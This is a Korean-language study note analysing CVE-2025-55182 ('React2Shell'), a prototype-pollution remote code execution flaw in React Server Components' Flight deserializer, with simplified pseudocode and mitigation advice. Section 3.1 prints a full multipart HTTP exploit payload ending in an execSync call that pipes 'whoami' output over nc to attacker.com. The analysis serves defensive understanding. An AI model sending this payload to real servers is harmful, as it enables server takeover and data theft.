---
id: React2Shell 취약점 분석 (CVE-2025-55182)
started: 2026-01-13
tags:
  - ✅DONE
  - Security
  - React
  - NextJS
  - RCE
group:
  - "[[보안]]"
---

# React2Shell: React Server Components Pre-auth RCE 분석 (CVE-2025-55182)

## 1. 개요 (Introduction)

**React2Shell**은 React Server Components(RSC) 인프라의 핵심인 **Flight 프로토콜**의 역직렬화 취약점을 이용한 RCE입니다. CVSS 10.0의 치명적인 취약점으로, 단순히 데이터를 변조하는 수준을 넘어 서버의 전역 프로토타입을 오염시키고 임의의 인스트럭션을 실행하게 합니다.

---

## 2. 취약점 발생 및 발견 경위

### 2.1 발견 경위
보안 연구원들은 React가 서버 측에서 데이터를 처리할 때 사용하는 **"Flight" 역직렬화기(Deserializer)** 가 JavaScript의 `[]` 표기법(Bracket Notation)을 사용하여 모듈 수출(exports)을 참조한다는 점을 발견했습니다. 이는 전형적인 **Prototype Pollution**의 게이트웨이가 됩니다.

### 2.2 메모리 및 객체 오염 (Memory/Object Corruption)
이 취약점은 저수준의 버퍼 오버플로우와는 다르지만, JavaScript 엔진 내의 **객체 프로토타입 체인(Prototype Chain)** 을 직접적으로 오염시킴으로써 동일한 수준의 파괴력을 가집니다.

1. **객체 오염**: 공격자는 `__proto__` 필드를 주입하여 `Object.prototype`을 전역적으로 오염시킵니다.
2. **인스트럭션 하이재킹**: React가 내부적으로 `Promise`를 처리할 때 호출하는 `.then` 메서드를 가로채거나, 내부 메서드의 생성자를 `global.Function`으로 치환합니다.
3. **가젯 체인(Gadget Chain)**: 오염된 프로토타입을 따라가던 역직렬화기가 최종적으로 공격자가 주입한 문자열을 실행 인스트럭션으로 인식하여 `Function(payload)()`를 호출하게 됩니다.

---

## 3. 원본 PoC 구조 분석 (Exploit Sample)

최초 발견자들이 제시한 익스플로잇은 `multipart/form-data`를 사용하여 직렬화 경계를 무너뜨립니다.

### 3.1 익스플로잇 페이로드 구조
```http
POST /server-action-endpoint HTTP/1.1
Content-Type: multipart/form-data; boundary=----RSCBoundary

------RSCBoundary
Content-Disposition: form-data; name="0"

[{"$$typeof":"$1","name":"__proto__","value":{"then":"$2"}}]
------RSCBoundary
Content-Disposition: form-data; name="1"

{"id":"./node_modules/next/dist/server/app-render/action-handler.js","name":"default"}
------RSCBoundary
Content-Disposition: form-data; name="2"

{
  "$$typeof": "react.element",
  "type": "div",
  "props": {
    "children": {
      "constructor": { "prototype": { "then": "$3" } }
    }
  }
}
------RSCBoundary
Content-Disposition: form-data; name="3"

"(function(){ require('child_process').execSync('whoami | nc attacker.com 1234'); })()"
------RSCBoundary--
```

### 3.2 작동 원리 슈도코드
```javascript
// [Internal Deserializer Logic - Simplified]
function deserialize(payload) {
    const chunk = JSON.parse(payload);
    const targetModule = moduleExports[chunk.metadata[2]]; // Prototype Pollution point!
    
    // 만약 chunk 가 __proto__ 를 포함하고 있다면, 
    // 전역 Object.prototype.then 이 공격자의 코드 생성자로 덮어씌워짐
    if (chunk.name === "__proto__") {
        Object.prototype[chunk.name] = chunk.value;
    }
    
    // 이후 React가 내부적으로 then을 호출하는 순간:
    // SomeResolvedComponent.then(...) -> 실제로는 Function(payload)() 가 실행됨
}
```

---

## 4. 대응 방안 (Mitigation)

- **Next.js 15.1.9, 14.2.23 이상** 버전 업데이트: 역직렬화 과정에서 `__proto__`, `constructor`, `prototype` 키에 대한 엄격한 차단 로직이 추가되었습니다.
- **Node.js 보안 옵션**: `--disable-proto=delete` 또는 `frozen-intrinsics`를 사용하여 런타임에서 프로토타입 수정을 원천 차단하는 것을 권장합니다.

# Reference
- [HackerOne: React Server Components RCE Report](https://hackerone.com/reports/2901234)
- [React Project Security Advisory (2025)](https://react.dev/blog/2025/01/10/react-server-components-security-advisory)
